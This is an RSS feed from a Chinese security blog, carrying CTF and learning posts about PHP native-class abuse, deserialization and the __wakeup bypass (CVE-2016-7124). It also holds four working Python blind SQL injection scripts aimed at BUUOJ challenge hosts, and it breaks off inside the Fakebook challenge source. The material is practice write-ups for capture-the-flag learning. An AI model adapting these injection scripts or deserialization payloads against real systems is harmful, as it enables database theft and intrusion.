<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Only_ONE</title>
    <link>https://www.lier.xin/algolia.json</link>
    <description>Recent content from Only_ONE</description>
    <generator>Hugo</generator>
    <language>zh-CN</language>
    
    <managingEditor>3310338687@qq.com (Lier)</managingEditor>
    <webMaster>3310338687@qq.com (Lier)</webMaster>
    
    <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
    
    <lastBuildDate>Tue, 08 Jul 2025 17:42:03 +0800</lastBuildDate>
    
    
    <atom:link href="https://www.lier.xin/index.xml" rel="self" type="application/rss&#43;xml" />
    

    
    

    <item>
      <title>Php原生类利用-1</title>
      <link>https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/</link>
      <pubDate>Tue, 08 Jul 2025 17:42:03 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8-1/</guid>
      <description>
        <![CDATA[<h1>Php原生类利用-1</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="php原生类-1">
<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb-1"></a>
php原生类-1
</h2><h3 id="php内置的类中存在可利用的魔术方法">
<a class="header-anchor" href="#php%e5%86%85%e7%bd%ae%e7%9a%84%e7%b1%bb%e4%b8%ad%e5%ad%98%e5%9c%a8%e5%8f%af%e5%88%a9%e7%94%a8%e7%9a%84%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95"></a>
php内置的类中存在可利用的魔术方法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$classes = get_declared_classes();
</span></span><span class="line"><span class="cl">foreach ($classes as $class) {
</span></span><span class="line"><span class="cl">    $methods = get_class_methods($class);
</span></span><span class="line"><span class="cl">    foreach ($methods as $method) {
</span></span><span class="line"><span class="cl">        if (in_array($method, array(
</span></span><span class="line"><span class="cl">//            &#39;__destruct&#39;,
</span></span><span class="line"><span class="cl">            &#39;__toString&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__wakeup&#39;,
</span></span><span class="line"><span class="cl">//             &#39;__sleep&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__call&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__callStatic&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__get&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__set&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__isset&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__unset&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__invoke&#39;,
</span></span><span class="line"><span class="cl">//            &#39;__set_state&#39;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
</span></span><span class="line"><span class="cl">        ))) {
</span></span><span class="line"><span class="cl">            print $class . &#39;::&#39; . $method . &#34;\n&#34;;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">} 
</span></span></code></pre></div><h2 id="php原生类的直接利用">
<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb%e7%9a%84%e7%9b%b4%e6%8e%a5%e5%88%a9%e7%94%a8"></a>
php原生类的直接利用
</h2><h3 id="ctfphp">
<a class="header-anchor" href="#ctfphp"></a>
ctf.php
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\$</span><span class="s2">flag_filename = &#39;flag&#39;.md5(???).&#39;php&#39;;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$c</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">print_r</span><span class="p">(</span><span class="nv">$count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="k">new</span> <span class="nv">$a</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">$flag_filename = &#39;flag&#39;.md5(???).&#39;php&#39;;
</span></span></span></code></pre></div><p>小计<code>trick</code></p>
        
        <hr><p>本文2025-07-08首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-08</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>Serialize_01</title>
      <link>https://www.lier.xin/post/serialize_01/</link>
      <pubDate>Tue, 08 Jul 2025 15:01:28 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/serialize_01/</guid>
      <description>
        <![CDATA[<h1>Serialize_01</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <p><a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化 | 晨曦的个人小站</a></p>
<p><a href="https://blog.csdn.net/m0_73512445/article/details/132513838">反序列化中_wakeup的绕过_wakeup绕过-CSDN博客</a></p>
<p><a href="https://ethe448.github.io/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/">从一道ctf题看php原生类 | Ethe&rsquo;s blog</a></p>
<h2 id="__wakeup绕过">
<a class="header-anchor" href="#__wakeup%e7%bb%95%e8%bf%87"></a>
<code>__wakeup</code>绕过
</h2><h3 id="cve-2016-7124">
<a class="header-anchor" href="#cve-2016-7124"></a>
<code>cve-2016-7124</code>
</h3><p>影响范围：</p>
<ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p>正常来说在反序列化过程中，会先调用 <code>__wakeup()</code> 方法再进行 <code>unserilize</code> 的操作，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，<code>__wakeup()</code>的执行会被跳过。</p>
        
        <hr><p>本文2025-07-08首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-08</p>]]>
      </description>
      
        <category>Learning</category>
      
    </item>
    
    

    <item>
      <title>Litctf2025-君の名は</title>
      <link>https://www.lier.xin/post/litctf2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF/</link>
      <pubDate>Tue, 08 Jul 2025 14:49:15 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/litctf2025-%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF/</guid>
      <description>
        <![CDATA[<h1>Litctf2025-君の名は</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Taki</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$musubi</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$magic</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">__unserialize</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;musubi&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;magic&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">musubi</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span><span class="nv">$args</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span><span class="p">}();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Mitsuha</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$memory</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">memory</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">KatawareDoki</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$soul</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$kuchikamizake</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">soul</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">flag</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">kuchikamizake</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;call error!no flag!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$Litctf2025</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;Litctf2025&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^[Oa]:[\d]+/i&#34;</span><span class="p">,</span> <span class="nv">$Litctf2025</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$Litctf2025</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>首先分析攻击点</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
</span></span></code></pre></div><p>这里<code>create_function</code>构造了一个匿名函数，执行该函数即可拿到flag
思路就清晰了
1、拿到匿名函数的函数名
2、执行该函数</p>
        
        <hr><p>本文2025-07-08首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-08</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>CISCN2019 华北赛区 Day2 Web1Hack_World</title>
      <link>https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/</link>
      <pubDate>Tue, 01 Jul 2025 14:25:19 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-day2-web1hack_world/</guid>
      <description>
        <![CDATA[<h1>CISCN2019 华北赛区 Day2 Web1Hack_World</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <p>题目很简单，主要是练习一下脚本，做下记录方便查阅</p>
<h2 id="exp">
<a class="header-anchor" href="#exp"></a>
exp
</h2><h3 id="枚举法">
<a class="header-anchor" href="#%e6%9e%9a%e4%b8%be%e6%b3%95"></a>
枚举法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="s2">&#34;if(substr((select(flag)from(flag)),</span><span class="si">{}</span><span class="s2">,1)=&#39;</span><span class="si">{}</span><span class="s2">&#39;,1,0)&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">j</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span></code></pre></div><h3 id="二分法">
<a class="header-anchor" href="#%e4%ba%8c%e5%88%86%e6%b3%95"></a>
二分法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://e57aa3be-d1dc-4ed4-a3a2-35878118c101.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># select=&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">result</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,1,0)&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Hello&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="时间盲注">
<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e7%9b%b2%e6%b3%a8"></a>
时间盲注
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">punctuation</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;id&#39;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1)=&#39;</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">&#39;,sleep(2),0)&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">j</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span></code></pre></div><h3 id="时间二分法">
<a class="header-anchor" href="#%e6%97%b6%e9%97%b4%e4%ba%8c%e5%88%86%e6%b3%95"></a>
时间二分法
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://47b3e9b9-1cba-42c3-9231-d5131f3a8df1.node5.buuoj.cn:81/index&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">left</span><span class="o">=</span><span class="mi">32</span>
</span></span><span class="line"><span class="cl">    <span class="n">right</span><span class="o">=</span><span class="mi">127</span>
</span></span><span class="line"><span class="cl">    <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">left</span><span class="o">&lt;</span><span class="n">right</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;id&#34;</span><span class="p">:</span><span class="sa">f</span><span class="s2">&#34;if(ascii(substr((select(flag)from(flag)),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">,0,sleep(2))&#34;</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">left</span><span class="o">=</span><span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">right</span><span class="o">=</span><span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span><span class="o">=</span><span class="p">(</span><span class="n">left</span><span class="o">+</span><span class="n">right</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">left</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></div>
        
        <hr><p>本文2025-07-01首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-01</p>]]>
      </description>
      
        <category>CTF-Great</category>
      
    </item>
    
    

    <item>
      <title>网鼎杯 2018 Fakebook</title>
      <link>https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/</link>
      <pubDate>Tue, 01 Jul 2025 14:19:27 &#43;0800</pubDate>
      <author>3310338687@qq.com (Lier)</author>
      <guid>https://www.lier.xin/post/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-fakebook/</guid>
      <description>
        <![CDATA[<h1>网鼎杯 2018 Fakebook</h1><p>作者：Lier（3310338687@qq.com）</p>
        
          <h2 id="思路">
<a class="header-anchor" href="#%e6%80%9d%e8%b7%af"></a>
思路
</h2><p><code>robots.txt</code>给出题目源码，访问下载，后缀去掉<code>.bak</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250630173513577.png" alt="image-20250630173513482"></p>
<h3 id="题目源码">
<a class="header-anchor" href="#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81"></a>
题目源码
</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">UserInfo</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
